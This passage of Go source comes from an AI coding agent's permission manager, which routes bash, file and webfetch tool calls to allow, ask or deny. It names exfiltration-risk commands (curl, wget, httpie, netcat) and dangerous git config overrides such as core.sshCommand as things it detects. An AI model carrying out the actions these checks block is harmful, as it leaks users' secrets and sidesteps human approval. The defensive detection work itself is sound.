		// cannot exfiltrate data off-machine, so secrets in headers/data sent
		// to localhost are never harmful — same rationale as loopback nc below.
		if subprocessTargetsLocalhost(command) {
			return false
		}
		switch fields[0] {
		case "curl":
			return isExfiltrationRiskCurl(fields)
		case "wget":
			return isExfiltrationRiskWget(fields)
		default:
			return isExfiltrationRiskHTTPie(fields)
		}
	case "nc", "ncat":
		return isExfiltrationRiskNetcat(fields)
	}

	return false
}

// IsHarmfulBashCommand returns true when the given bash command is
// inherently destructive or risky and should never be auto-allowed.
// This covers:
//   - git revert, reset, clean, checkout, restore, switch (any args)
//   - git stash — except the read-only inspection forms "list" and "show"
//   - git push / pull with --force or -f
//   - curl/wget/httpie with data exfiltration risk (file upload, env var
//     injection, subshell expansion)
//   - netcat commands that can send arbitrary data
//
// Harmful operations always require human approval — they cannot be
// auto-allowed by the LLM auto-permission layer and cannot be
// persisted as "always allow" rules. The single exception is the
// read-only stash inspection forms ("git stash list"/"git stash show",
// isReadOnlyGitStashForm) — without it the whole stash family would be
// routed to a human ask before the auto-allow lists or the judge ever see
// it, making the matching always-ALLOW lines in the bundled gatekeeper
// prompt dead text.
func IsHarmfulBashCommand(command string) bool {
	cmd := strings.TrimSpace(command)
	fields := splitShellFields(cmd)
	if len(fields) < 2 {
		return false
	}

	// --- Git destructive commands ---
	// Dangerous "-c" config overrides (protocol.ext.allow, core.sshCommand,
	// etc.) are always harmful — they can enable code execution even on
	// read-only subcommands like ls-remote.
	if fields[0] == "git" && hasDangerousGitConfig(fields) {
		return true
	}
	// Transparent to wrappers like `git --no-pager` and `git -C /tmp` (but
	// NOT "-c" for the allowlist — see gitSubcommandIndex). For harmful
	// detection we DO skip "-c" so "git -c k=v reset --hard" is still
	// recognized as harmful.
	if fields[0] == "git" {
		idx := gitSubcommandIndexSkippingC(fields)
		if idx != -1 && idx+1 <= len(fields) {
			sub := fields[idx]
			prefix := "git " + sub
			// "git stash" is harmful as a family (pop/apply/drop/clear/branch
			// can lose or move stashes; a bare "git stash" defaults to push),
			// but two inspection forms are read-only — "git stash list" and
			// "git stash show" — and are mirrored as always-ALLOW in the
			// bundled gatekeeper prompt (config.BundledAutoPermissionPromptBody).
			// Excluding them here is what makes those prompt rules reachable:
			// this check runs before every auto-allow and the LLM judge, so
			// without the exclusion "git stash list" would always be routed
			// to a human ask and the prompt line would be dead text.
			if sub == "config" && gitConfigWriteArgs(fields[idx+1:]) {
				// Code-side backstop for the gatekeeper prose: a config write
				// plants a persistent key (core.sshCommand, core.hooksPath,
				// url.*.insteadOf, …) that code-auto-allowed read-only commands
				// like "git ls-remote" later execute. Reads stay judge-mediated.
				return true
			}
			if harmfulBashPrefixes[prefix] && !(prefix == "git stash" && isReadOnlyGitStashForm(fields[idx+1:])) {
				return true
			}
			if flags, ok := harmfulBashForceFlags[prefix]; ok {
				for _, part := range fields[idx+1:] {
					if flags[part] {
						return true
					}
				}
			}
		}
	}

	// --- Data exfiltration risk (curl, wget, httpie, nc) ---
	if isExfiltrationRiskCommand(cmd) {
		return true
	}

	return false
}

// IsHarmfulRequest checks whether a permission request is for a
// harmful operation that requires human approval even when the
// auto-permission layer is active. Bash commands are checked via
// IsHarmfulBashCommand; other tools can be added here as needed.
func IsHarmfulRequest(req PermissionRequest) bool {
	if req.ToolName == "bash" && req.Command != "" {
		return IsHarmfulBashCommand(req.Command)
	}
	return false
}

// ShellControlKeywords are bash/sh constructs that are not real commands and
// make no sense as an "always allow prefix" rule. Shared by every surface
// that offers an always-allow choice (TUI dialog, web/desktop dialog, remote
// resolvers) so the availability rules cannot drift.
var ShellControlKeywords = map[string]bool{
	"if": true, "else": true, "elif": true, "fi": true,
	"then": true, "while": true, "do": true, "done": true,
	"for": true, "case": true, "esac": true, "until": true,
	"function": true, "select": true, "time": true,
}

// AlwaysRuleChoiceAvailable reports whether the "always allow this rule"
// choice may be offered for req. Git mutating subcommands are excluded: a
// two-word `git <sub>` always-allow would blanket-approve every future
// invocation of that subcommand (e.g. all `git push ...`), so they must be
// approved each time. Read-only git is auto-allowed and never reaches the
// ask path; harmful git already cannot persist. Shell control-flow keywords
// (if, else, while, …) are also excluded: they are not real commands and an
// always-allow prefix for them is meaningless.
func AlwaysRuleChoiceAvailable(req PermissionRequest) bool {
	if req.ToolName == "bash" && req.Scope == PermissionScopeBashPrefix {
		if strings.HasPrefix(req.Prefix, "git ") || req.Prefix == "git" {
			return false
		}
		if ShellControlKeywords[req.Prefix] {
			return false
		}
	}
	return true
}

// AlwaysToolChoiceAvailable reports whether the "always allow this tool"
// choice may be offered for req. The bash tool is excluded: a tool-level
// allow blanket-approves every future shell command from one prompt, which
// is too broad to surface as a single click.
func AlwaysToolChoiceAvailable(req PermissionRequest) bool {
	return req.ToolName != "bash"
}

func NewPermissionManager() *PermissionManager {
	pm := &PermissionManager{
		mode:               PermissionModeNormal,
		rules:              make(map[string]PermissionLevel),
		userConfirmedRules: make(map[string]bool),
		patterns:           make([]patternRule, 0),
		pathPatterns:       make(map[string][]pathPatternEntry),
		bashPrefixes:       make(map[string]PermissionLevel),
		bashAutoAllow:      make(map[string]bool),
		bashPrefixModes:    make(map[string]string),
		webfetchDomains:    make(map[string]PermissionLevel),
	}
	for k, v := range bashAutoAllowPrefixes {
		pm.bashAutoAllow[k] = v
	}
	for k, v := range bashAutoAllowDefaultModes {
		pm.bashPrefixModes[k] = v
	}
	for _, name := range []string{"read", "glob", "grep", "list", "lsp", "lsp_diagnostics", "skill", "load_skill", "question", "todoread", "todowrite", "todo_update", "advisor", "task", "task_status", "agent_status", "repo_overview", "plan_enter", "plan_exit", "wait", "bash_output", "kill_shell", "list_processes", "ocr", "cron"} {
		pm.rules[name] = PermissionAllow
	}
	for _, name := range []string{"write", "edit", "multiedit", "multi_file_edit", "replace_lines", "apply_patch", "format", "imagegen"} {
		pm.SetRule(name, PermissionAllow)
	}
	for _, name := range []string{"delete", "bash", "webfetch", "websearch", "repo_clone", "mcp_*"} {
		pm.SetRule(name, PermissionAsk)
	}
	// No bash prefixes are banned by default — bans are opt-in via
	// `/ban add <prefix>`. The `sed` special-casing below (compound-command
	// parsing) applies to any sed rule a user configures.
	// Adhere to Claude Code's .claude/settings.json permissions: load global
	// user rules now; project-specific rules are added when workDir is set via
	// SetWorkDir (covers /cd, desktop project switches, and per-session roots).
	pm.LoadClaudePermissions(pm.workDir)
	return pm
}

func (pm *PermissionManager) Check(toolName string) PermissionLevel {
	if level, ok := pm.rules[toolName]; ok {
		return level
	}

	for _, p := range pm.patterns {
		if matchPattern(p.pattern, toolName) {
			return p.level
		}
	}

	return PermissionAsk
}

func (pm *PermissionManager) LoadFromConfig(cfg map[string]interface{}) {
	if cfg == nil {
		return
	}
	for toolName, val := range cfg {
		switch v := val.(type) {
		case string:
			pm.SetRule(toolName, PermissionLevel(v))
		case map[string]interface{}:
			for pattern, levelVal := range v {
				if levelStr, ok := levelVal.(string); ok {
					level := PermissionLevel(levelStr)
					if validPermissionLevel(level) {
						pm.SetPathRule(toolName, pattern, level)
					}
				}
			}
		}
	}
}

func (pm *PermissionManager) LoadFromOcode(cfg config.PermissionConfig) {
	if cfg.Mode != "" {
		pm.SetMode(PermissionMode(cfg.Mode))
	}
	if cfg.Auto != nil {
		pm.SetAutoPermissionEnabled(cfg.Auto.Enabled)
		pm.autoGrants = append([]config.AutoGrant(nil), cfg.Auto.Grants...)
	} else {
		pm.SetAutoPermissionEnabled(false)
		pm.autoGrants = nil
	}
	for k, v := range cfg.Tools {
		level := PermissionLevel(v)
		if validPermissionLevel(level) {
			pm.SetRule(k, level)
		}
	}
	for k, v := range cfg.Bash.Prefixes {
		level := PermissionLevel(v)
		if validPermissionLevel(level) {
			pm.SetBashPrefixRule(k, level)
		}
	}
	for _, prefix := range cfg.Bash.AutoAllowPrefixes {
		prefix = strings.TrimSpace(prefix)
		if prefix == "" {
			continue
		}
		pm.bashAutoAllow[prefix] = true
		if _, ok := pm.bashPrefixModes[prefix]; !ok {
			pm.bashPrefixModes[prefix] = bashPrefixModeReadOnly
		}
	}
	for prefix, mode := range cfg.Bash.PrefixModes {
		mode = strings.TrimSpace(mode)
		if mode != bashPrefixModeReadOnly && mode != bashPrefixModeMutating && mode != bashPrefixModeNever {
			continue
		}
		pm.bashPrefixModes[prefix] = mode
	}
}

func (pm *PermissionManager) Decide(toolName string, args json.RawMessage) PermissionDecision {
	pm.emitDebug("perm", fmt.Sprintf("Decide: tool=%s mode=%s", toolName, pm.mode))
	if pm.mode == PermissionModeLocked {
		if isReadOnlyTool(toolName) {
			pm.emitDebug("perm", fmt.Sprintf("Decide ALLOW (locked, read-only): tool=%s", toolName))
			return PermissionDecision{Level: PermissionAllow}
		}
		pm.emitDebug("perm", fmt.Sprintf("Decide DENY (locked, not read-only): tool=%s", toolName))
		return PermissionDecision{Level: PermissionDeny}
	}

	if toolName == "bash" {
		command := bashCommand(args)
		if isHardBlockedCommand(command) {
			pm.emitDebug("perm", fmt.Sprintf("Decide DENY (hard-blocked): tool=bash command=%q", command))
			return PermissionDecision{Level: PermissionDeny, HardDeny: true}
		}
		// Claude Code settings: a matching deny is a hard block even before
		// the dangerous-rm ask (deny > ask). Check each subcommand so
		// compound lines like "echo hi; rm -rf /" are still caught.
		if parsed, err := parseShellCommandLine(command); err == nil {
			for _, cmd := range parsed {
				if sub := rebuildCommandLine(cmd.cmdWords); sub != "" && pm.claudeIsDenied(sub) {
					pm.emitDebug("perm", fmt.Sprintf("Decide DENY (claude deny): tool=bash command=%q", command))
					return PermissionDecision{Level: PermissionDeny, HardDeny: true}
				}
			}
		}
		if parsed, err := parseShellCommandLine(command); err == nil {
			for _, cmd := range parsed {
				if reason := dangerousRmReason(pm, cmd.cmdWords); reason != "" {
					pm.emitDebug("perm", fmt.Sprintf("Decide ASK (dangerous rm): tool=bash command=%q reason=%s", command, reason))
					return PermissionDecision{Level: PermissionAsk, Request: bashPermissionRequest(args, command, "rm")}
				}
			}
		}
		// Self-escalation guard (mode-independent, INDEX Decision 8): the agent
		// must not silently shortcut its own permissions by editing the files
		// that define them, or by flipping its mode/rules via the local server.
		// This sits ABOVE the YOLO/sandbox auto-allow shortcuts (like the
		// hard-block layer) so it applies in every mode. Writes to
		// permission-defining targets resolve to Ask → routed through the
		// auto-permission judge when auto is on, else a human prompt.
		if pm.isPermissionEscalation(command) {
			return PermissionDecision{Level: PermissionAsk, Request: bashPermissionRequest(args, command, "permission.escalation")}
		}
		if pm.mode == PermissionModeYOLO {
			pm.emitDebug("perm", "Decide ALLOW (yolo): tool=bash")
			return PermissionDecision{Level: PermissionAllow}
		}
		// Sandbox = YOLO's prompt-bypass plus OS write-confinement: allow
		// (the bash builder wraps the command so writes outside the writable
		// roots fail at the OS level). Hard blocks and dangerous-rm still win,
		// having returned above. Only when the OS has a backend — on Windows
		// sandbox degrades to normal (asks).
		//
		// The sensitive set (auth.json, ocode config/data-dir writes, ~/.ssh,
		// .env) stays authoritative in sandbox (Decision 3/9): it is ASK, NOT
		// auto-allowed. The OS write-wall does not protect it — auth.json/ssh
		// are readable globally and config/.env live in writable roots — so the
		// permission layer must. Reroutes to the auto-permission judge when auto
		// is on, else a human prompt (sandbox never disables auto).
		if sd := pm.sensitiveSandboxDecision(command); sd != nil {
			return *sd
		}
		if pm.mode == PermissionModeSandbox && sandboxSupported() {
			pm.emitDebug("perm", "Decide ALLOW (sandbox, OS-wrapped): tool=bash")
			return PermissionDecision{Level: PermissionAllow}
		}

		// Interpreter executions (python3 << EOF, node -e "...", etc.) are
		// handled by the structured LLM interpreter path, not the per-token
		// prefix checker. Routing them here avoids noisy per-line ASK decisions
		// from heredoc body content being tokenized as separate commands.
		if ie, ok := classifyInterpreterExecution(command); ok &&
			(ie.SourceMode == "heredoc" || ie.SourceMode == "inline_eval" || ie.SourceMode == "script_file" || ie.SourceMode == "stdin_pipe") {
			pm.emitDebug("perm", fmt.Sprintf("Decide ASK (interpreter): lang=%s mode=%s", ie.Language, ie.SourceMode))
			return PermissionDecision{Level: PermissionAsk, Request: bashPermissionRequest(args, command, "bash.interpreter."+ie.Language)}
		}

		// Parse the compound command. Strip heredoc bodies first so their
		// content lines (e.g. Go source inside `cat > file << 'EOF'`) are not
		// tokenized as separate shell commands by the newline→';' rule.
		parseTarget := command
		if header, docs := extractHeredocs(command); len(docs) > 0 {
			parseTarget = header
		}
		parsedCmds, err := parseShellCommandLine(parseTarget)
		if err != nil {
			// Parsing error (unbalanced quotes, etc.): fallback to asking for safety
			level := pm.Check(toolName)
			if level == PermissionAsk {
				return PermissionDecision{Level: PermissionAsk, Request: bashPermissionRequest(args, command, "")}
			}
			return PermissionDecision{Level: level}
		}

		// Evaluate each constituent command, environment variable, and redirection
		var finalDecision *PermissionDecision
		for _, cmd := range parsedCmds {
			dec := pm.decideSingleCommand(args, cmd)
			if dec.Level == PermissionDeny {
				return dec
			}
			if dec.Level == PermissionAsk {
				// Keep track of the first Ask decision to return if none are Deny
				if finalDecision == nil {
					finalDecision = &dec
				}
			}
		}

		if finalDecision != nil {
			return *finalDecision
		}
		pm.emitDebug("perm", "Decide ALLOW (bash, no ask/deny): tool=bash")
		return PermissionDecision{Level: PermissionAllow}
	}

	if pm.mode == PermissionModeYOLO {
		pm.emitDebug("perm", fmt.Sprintf("Decide ALLOW (yolo): tool=%s", toolName))
		return PermissionDecision{Level: PermissionAllow}
	}

	if pathScopedTools[toolName] {
		path := extractPathFromArgs(toolName, args)
		if path != "" {
			// Check path-based permission patterns first (e.g., opencode.json
			// "permission" entries with glob patterns). An explicit "allow" or
			// "deny" overrides the normal workdir/sensitive checks.
			if level := pm.CheckPathPatterns(toolName, path); level != "" {
				if level == PermissionAsk {
					pm.emitDebug("perm", fmt.Sprintf("Decide ASK (path pattern): tool=%s path=%s", toolName, path))
					return PermissionDecision{Level: PermissionAsk, Request: &PermissionRequest{
						ToolName: toolName, Args: args, Scope: PermissionScopeTool, Rule: "tool." + toolName + ".path_pattern",
					}}
				}
				pm.emitDebug("perm", fmt.Sprintf("Decide %s (path pattern): tool=%s path=%s", level, toolName, path))
				return PermissionDecision{Level: level}
			}
			// Relative paths and glob patterns (non-absolute) are implicitly within workDir.
			// Use isWithinAllowedScope (not isWithinWorkDir) so extra_allowed_paths
			// persisted via "always allow this path" are respected for all tools, not
			// just read-only ones.
			if filepath.IsAbs(path) && !isWithinAllowedScope(pm, path) {
				// Temp directories are always allowed (cross-platform)
				if isTempDir(path) {
					pm.emitDebug("perm", fmt.Sprintf("Decide ALLOW (temp dir): tool=%s path=%s", toolName, path))
					return PermissionDecision{Level: PermissionAllow}
				}
				// Managed cache dirs (tool-results + cloned-repo cache) are always
				// allowed for read operations — they contain ocode's own state.
				if isReadOnlyTool(toolName) && isWithinAllowedScope(pm, path) {
					pm.emitDebug("perm", fmt.Sprintf("Decide ALLOW (allowed scope, read-only): tool=%s path=%s", toolName, path))
					return PermissionDecision{Level: PermissionAllow}
				}
				// Read-only tools on immutable, developer-trusted roots (the Go
				// module cache, written 0444 and content-addressed) are benign —
				// allow without prompting or consulting the permission model.
				if isReadOnlyTool(toolName) && isImmutableReadRoot(path) {
					pm.emitDebug("perm", fmt.Sprintf("Decide ALLOW (immutable read root): tool=%s path=%s", toolName, path))
					return PermissionDecision{Level: PermissionAllow}
				}
				// Only user-confirmed allows ("always allow this tool") override the
				// out-of-scope gate. Default allow rules do NOT bypass it — the
				// user should be asked when writing outside the workdir.
				if pm.IsUserConfirmedRule(toolName) {
					pm.emitDebug("perm", fmt.Sprintf("Decide ALLOW (out-of-scope, user-confirmed tool): tool=%s path=%s", toolName, path))
					return PermissionDecision{Level: PermissionAllow}
				}
				pm.emitDebug("perm", fmt.Sprintf("Decide ASK (out-of-scope): tool=%s path=%s", toolName, path))
				return PermissionDecision{Level: PermissionAsk, Request: &PermissionRequest{
					ToolName: toolName, Args: args, Scope: PermissionScopeTool, Rule: "tool." + toolName + ".out_of_scope",
				}}
			}
			if isSensitivePath(path) {
				if pm.IsUserConfirmedRule(toolName) {
					pm.emitDebug("perm", fmt.Sprintf("Decide ALLOW (sensitive, user-confirmed tool): tool=%s path=%s", toolName, path))
					return PermissionDecision{Level: PermissionAllow}
				}
				pm.emitDebug("perm", fmt.Sprintf("Decide ASK (sensitive): tool=%s path=%s", toolName, path))
				return PermissionDecision{Level: PermissionAsk, Request: &PermissionRequest{
					ToolName: toolName, Args: args, Scope: PermissionScopeTool, Rule: "tool." + toolName + ".sensitive_path",
				}}
			}
			if toolName == "delete" {
				if pm.IsUserConfirmedRule(toolName) {
					pm.emitDebug("perm", fmt.Sprintf("Decide ALLOW (delete, user-confirmed tool): tool=%s path=%s", toolName, path))
					return PermissionDecision{Level: PermissionAllow}
				}
				// Sandbox mode: the path has already cleared the workdir/allowed-scope
				// and sensitive-path gates above, so it is treated the same as write/edit
				// (which fall through to Allow at the bottom of this branch) instead of
				// singling delete out for an extra prompt.
				if pm.mode == PermissionModeSandbox {
					pm.emitDebug("perm", fmt.Sprintf("Decide ALLOW (delete, sandbox): tool=%s path=%s", toolName, path))
					return PermissionDecision{Level: PermissionAllow}
				}
				pm.emitDebug("perm", fmt.Sprintf("Decide ASK (delete): tool=%s path=%s", toolName, path))
				return PermissionDecision{Level: PermissionAsk, Request: &PermissionRequest{
					ToolName: toolName, Args: args, Scope: PermissionScopeTool, Rule: "tool." + toolName + ".delete",
				}}
			}
			pm.emitDebug("perm", fmt.Sprintf("Decide ALLOW (path in workdir): tool=%s path=%s", toolName, path))
			return PermissionDecision{Level: PermissionAllow}
		}
	}

	// Webfetch domain tracking
	if toolName == "webfetch" {
		path := extractPathFromArgs(toolName, args)
		domain := extractDomainFromURL(path)
		if domain != "" {
			if isLocalhostDomain(domain) {
				pm.emitDebug("perm", fmt.Sprintf("Decide ALLOW (webfetch localhost): tool=%s domain=%s", toolName, domain))
				return PermissionDecision{Level: PermissionAllow}
			}
			if level, exists := pm.webfetchDomains[domain]; exists {
				pm.emitDebug("perm", fmt.Sprintf("Decide %s (webfetch domain cached): tool=%s domain=%s", level, toolName, domain))
				return PermissionDecision{Level: level}
			}
			pm.emitDebug("perm", fmt.Sprintf("Decide ASK (webfetch domain): tool=%s domain=%s", toolName, domain))
			return PermissionDecision{Level: PermissionAsk, Request: &PermissionRequest{
				ToolName: toolName, Args: args, Scope: PermissionScopeTool, Rule: "webfetch.domain." + domain,
			}}
		}
	}

	level := pm.Check(toolName)
	if level == PermissionAsk {
		pm.emitDebug("perm", fmt.Sprintf("Decide ASK (tool rule): tool=%s", toolName))
		return PermissionDecision{Level: PermissionAsk, Request: &PermissionRequest{ToolName: toolName, Args: args, Scope: PermissionScopeTool, Rule: "tool." + toolName}}
	}
	pm.emitDebug("perm", fmt.Sprintf("Decide %s (tool rule): tool=%s", level, toolName))
	return PermissionDecision{Level: level}
}

func bashPermissionRequest(args json.RawMessage, command, prefix string) *PermissionRequest {
	scope := PermissionScopeTool
	rule := "tool.bash"
	if prefix != "" {
		scope = PermissionScopeBashPrefix
		if strings.HasPrefix(prefix, "bash.interpreter.") {
			rule = prefix
		} else {
			rule = "bash.prefix." + prefix
		}
	}
	return &PermissionRequest{ToolName: "bash", Args: args, Command: command, Prefix: prefix, Scope: scope, Rule: rule}
}

// bashPathPermissionRequest builds an Ask request for a bash command that
// targets an out-of-workspace path. It carries the offending path so the human
// prompt can offer to persist that root to extra_allowed_paths (rather than a
// broad bash-prefix rule), and so verifyAutoGrant refuses to auto-grant it.
func bashPathPermissionRequest(args json.RawMessage, command, outPath string) *PermissionRequest {
	return &PermissionRequest{
		ToolName:       "bash",
		Args:           args,
		Command:        command,
		Scope:          PermissionScopeTool,
		Rule:           "bash.path.out_of_scope",
		OutOfScopePath: outPath,
	}
}

// resolveForScopeCheck resolves rawPath to an absolute, symlink-resolved path
// suitable for prefix comparison against an allowed root. For a not-yet-existing
// path (e.g. mkdir creating a deep directory or a write creating a new file) it
// walks up until it finds the nearest existing ancestor, resolves that ancestor,
// and rejoins the missing suffix. Returns false when no ancestor can be resolved.
func resolveForScopeCheck(rawPath string) (string, bool) {
	absPath, err := filepath.Abs(rawPath)
	if err != nil {
		return "", false
	}
	current := absPath
	var suffix []string
	for {
		resolved, err := filepath.EvalSymlinks(current)
		if err == nil {
			for i := len(suffix) - 1; i >= 0; i-- {
				resolved = filepath.Join(resolved, suffix[i])
			}
			return resolved, true
		}
		parent := filepath.Dir(current)
		if parent == current {
			return "", false
		}
		suffix = append(suffix, filepath.Base(current))
		current = parent
	}
}

// pathUnderRoot reports whether resolved equals root or sits beneath root/.
// On Windows, paths are compared case-insensitively because the filesystem is
// case-insensitive there — a case-sensitive compare would wrongly treat
// C:\Users\… and c:\users\… as distinct and leak past scope/allow gates. We fold
// only on Windows (the Go ecosystem convention, e.g. x/tools): macOS is also
// case-insensitive by default but folding there risks over-matching, so we stay
// conservative and keep the historical case-sensitive behavior off-Windows.
func pathUnderRoot(resolved, root string) bool {
	return pathUnderRootFold(resolved, root, runtime.GOOS == "windows")
}

// pathUnderRootFold is the case-fold-parametrized core of pathUnderRoot, split
// out so the folding behavior is testable without depending on the host GOOS.
func pathUnderRootFold(resolved, root string, fold bool) bool {
	if root == "" {
		return false
	}
	rootSep := root + string(filepath.Separator)
	if fold {
		return strings.EqualFold(resolved, root) ||
			strings.HasPrefix(strings.ToLower(resolved), strings.ToLower(rootSep))
	}
	return resolved == root || strings.HasPrefix(resolved, rootSep)
}

func isWithinWorkDir(pm *PermissionManager, rawPath string) bool {
	if pm.workDir == "" {
		return true
	}
	resolved, ok := resolveForScopeCheck(rawPath)
	if !ok {
		return false
	}
	return pathUnderRoot(resolved, pm.workDir)
}

// isWithinAllowedScope reports whether resolved is in-scope for bash auto-allow:
// inside the working dir, any extra allowed root (extra_allowed_paths persisted
// via "always allow this path"), the managed cache dirs, or a well-known temp
// dir. It is the bash-layer counterpart to IsPathWithinAllowedRoots and is the
// single predicate both canAutoAllowInRoot and firstOutOfScopePath consult, so a
// path that has been added to extra_allowed_paths stops re-prompting AND is never
// reported as out-of-scope. Without this, persisting a path was a no-op for the
// bash command that triggered it (the workdir-only check stayed blind to it).
func isWithinAllowedScope(pm *PermissionManager, resolved string) bool {
	return pm.IsPathWithinAllowedRoots(resolved) || isTempDir(resolved) || isAllowedDevicePath(resolved)
}

// isAllowedDevicePath reports whether resolved is one of the standard POSIX
// stream/tty device special files. These are process-local handles, not real
// filesystem locations under /dev, so they carry no meaningful path-scope risk
// whether they appear as a plain command argument (e.g. "cat /dev/stdin") or
// as a shell redirection target (e.g. "2>/dev/null").
func isAllowedDevicePath(resolved string) bool {
	switch resolved {
	case "/dev/null", "/dev/stdin", "/dev/stdout", "/dev/stderr", "/dev/tty":
		return true
	default:
		return false
	}
}

// AllowedRoots returns the unified set of filesystem roots that are in-scope for
// auto-permission decisions: the working directory, every extra allowed root
// registered with the file-tool confinement layer (tool.ExtraAllowedRoots), the
// managed cache dirs (tool.CacheRoots — tool-results + cloned-repo cache), and
// the well-known temp directories (including the OS-specific os.TempDir()).
// Roots are symlink-resolved and de-duplicated. This is the single authoritative
// scope model shared by the permission prompt, the interpreter effect verifier,
// and tool confinement — see the 2026-06-01 design's "permissions and tool
// confinement must share one root model" principle.
func (pm *PermissionManager) AllowedRoots() []string {
	seen := make(map[string]struct{})
	var roots []string
	add := func(p string) {
		if p == "" {
			return
		}
		resolved, err := filepath.EvalSymlinks(p)
		if err != nil {
			resolved = filepath.Clean(p)
		}
		if _, ok := seen[resolved]; ok {
			return
		}
		seen[resolved] = struct{}{}
		roots = append(roots, resolved)
	}
	if pm != nil {
		add(pm.workDir)
	}
	for _, r := range tool.ExtraAllowedRoots() {
		add(r)
	}
	// Managed cache dirs (truncated tool-results, cloned-repo cache). These are
	// allowed by the read tool's confinedPath; include them here so bash reads of
	// the same files (tail/sed/cat on a tool-results txt) are in-scope for both
	// the static in-root auto-allow and the LLM permission prompt's allowed_roots.
	for _, r := range tool.CacheRoots() {
		add(r)
	}
	// Ocode's global data dir (~/.local/share/opencode) contains memory files,
	// sessions, auth, and usage records. Allow read/write without prompting.
	if dataDir, err := paths.GlobalDataDir(); err == nil {
		add(dataDir)
	}
	// Ocode's global config dir (~/.config/opencode; %APPDATA%\opencode on
	// Windows) holds opencode.json, ocodeconfig.json, the auto-permission
	// prompts, skills/, and plugins/. The auto-LLM permission layer must be
	// able to read/write ocode's own configuration without falling back to a
	// human prompt, so it joins the shared allowed-root model exactly like the
	// data dir above. The addition is prefix-boundary safe (pathUnderRoot), so
	// only paths under the expanded home-dir config root are in scope —
	// $HOME/.config itself and sibling directories stay out of scope. Sensitive
	// *contents* are handled separately by the redaction gate (see
	// redact.IsSensitiveFile), which masks secrets when these files are read.
	if configDir, err := paths.GlobalConfigDir(); err == nil {
		add(configDir)
	}
	// Cross-tool agent state (~/.claude): the user granted Claude Code read/write
	// access to this dir; keep it in the same shared scope. Note this widens the
	// write surface to that agent's state.
	if home, err := os.UserHomeDir(); err == nil {
		add(filepath.Join(home, ".claude"))
	}
	// Language dependency cache/registry directories (Go module cache, npm
	// cache, cargo registry, pip cache, Maven/Gradle caches, etc.). These are
	// content-addressed or append-only stores; read-only access is always safe,
	// and write access is guarded by the read-only-tool check in Decide.
	for _, r := range languageDepRoots() {
		add(r)
	}
	// User-owned writable caches and binary destinations — sandboxed commands
	// must be able to write here (go build cache, uv/bun caches, cargo/go bins).
	// Kept separate from languageDepRoots so isImmutableReadRoot does not
	// auto-allow reads of the entire ~/.cache tree.
	for _, r := range userWritableRoots() {
		add(r)
	}
	add("/tmp")
	add("/var/tmp")
	add(os.TempDir())
	sort.Strings(roots)
	return roots
}

// TempRootAliases returns the well-known temp directories whose symlink-resolved
// form differs from the spelling commands actually use (macOS: /tmp ->
// /private/tmp, $TMPDIR -> /private/var/folders/...). AllowedRoots lists only
// the resolved form, which a permission judge cannot map back to the literal
// "/tmp/..." in a command; the prompt prints these pairs so the judge sees both.
func TempRootAliases() [][2]string {
	var out [][2]string
	seen := map[string]struct{}{}
	for _, p := range []string{"/tmp", "/var/tmp", os.TempDir()} {
		clean := filepath.Clean(p)
		if _, ok := seen[clean]; ok || clean == "" {
			continue
		}
		seen[clean] = struct{}{}
		resolved, err := filepath.EvalSymlinks(clean)
		if err != nil || resolved == clean {
			continue
		}
		out = append(out, [2]string{clean, resolved})
	}
	return out
}

// AllowedRootsClassified returns the same single authoritative root model as
// AllowedRoots, but each root carries a capability flag: writable roots (the
// session project, extra allowed paths, language dep caches, temp dirs) versus
// read-only roots (managed caches, the global data + config dirs whose
// integrity sandbox must preserve — auth.json, sessions). The sandbox backend
// consumes this via NewRootSet; AllowedRoots() keeps returning the flat union
// for its existing callers. The "/" writable boundary guard is applied here
// too: no writable spec may resolve to the filesystem root.
func (pm *PermissionManager) AllowedRootsClassified() []sandbox.RootSpec {
	seen := make(map[string]struct{})
	var specs []sandbox.RootSpec
	add := func(p string, writable bool) {
		if p == "" {
			return
		}
		resolved, err := filepath.EvalSymlinks(p)
		if err != nil {
			resolved = filepath.Clean(p)
		}
		if writable && resolved == "/" {
			return
		}
		if _, ok := seen[resolved]; ok {
			return
		}
		seen[resolved] = struct{}{}
		specs = append(specs, sandbox.RootSpec{Path: resolved, Writable: writable})
	}
	if pm != nil {
		add(pm.workDir, true)
	}
	for _, r := range tool.ExtraAllowedRoots() {
		add(r, true)
	}
	// Managed cache dirs (truncated tool-results, cloned-repo cache): reads
	// must keep working, but there is no reason to mutate them under sandbox.
	for _, r := range tool.CacheRoots() {
		add(r, false)
	}
	// Global data dir (~/.local/share/opencode: auth.json, sessions, memory)
	// and config dir (~/.config/opencode): classified READ-ONLY so sandbox
	// preserves their integrity (auth + session store must never be mutated
	// by a sandboxed command).
	if dataDir, err := paths.GlobalDataDir(); err == nil {
		add(dataDir, false)
	}
	if configDir, err := paths.GlobalConfigDir(); err == nil {
		add(configDir, false)
	}
	// Cross-tool agent state (~/.claude): writable — the user explicitly
	// granted read/write access to this dir (same rationale as the flat union).
	if home, err := os.UserHomeDir(); err == nil {
		add(filepath.Join(home, ".claude"), true)
	}
	// Language dependency caches (npm/pip/cargo/go/maven/gradle) must stay
	// writable so npm install / pip work under sandbox.
	for _, r := range languageDepRoots() {
		add(r, true)
	}
	// User-owned writable caches and binary destinations — distinct from
	// language dep caches so they do not leak into isImmutableReadRoot.
	for _, r := range userWritableRoots() {
		add(r, true)
	}
	add("/tmp", true)
	add("/var/tmp", true)
	add(os.TempDir(), true)
	sort.Slice(specs, func(i, j int) bool { return specs[i].Path < specs[j].Path })
	return specs
}

// IsPathWithinAllowedRoots reports whether rawPath resolves inside any root
// returned by AllowedRoots. Used by the interpreter effect verifier to confirm
// that inferred read/write/delete targets stay within policy.
func (pm *PermissionManager) IsPathWithinAllowedRoots(rawPath string) bool {
	resolved, ok := resolveForScopeCheck(rawPath)
	if !ok {
		return false
	}
	for _, root := range pm.AllowedRoots() {
		if pathUnderRoot(resolved, root) {
			return true
		}
	}
	return false
}

// tempRootsForGOOS returns the temp roots the permission engine treats as safe.
// Linux/macOS get the conventional well-known dirs; Windows uses os.TempDir().
func tempRootsForGOOS(goos string) []string {
	return pathscope.TempRootsForGOOS(goos)
}

// isTempDirUnderRoots reports whether rawPath resolves inside any provided temp root.
func isTempDirUnderRoots(rawPath string, roots []string) bool {
	return pathscope.IsTempDirUnderRoots(rawPath, roots)
}

// isTempDir returns true if the given path is within a well-known system temp
// directory.
func isTempDir(rawPath string) bool {
	return pathscope.IsTempDir(rawPath)
}

// goModCacheRoots returns the Go module cache directories. The module cache is
// content-addressed and written mode 0444 by the toolchain — it is immutable by
// design, so read-only access to it is always safe. Resolution order mirrors the
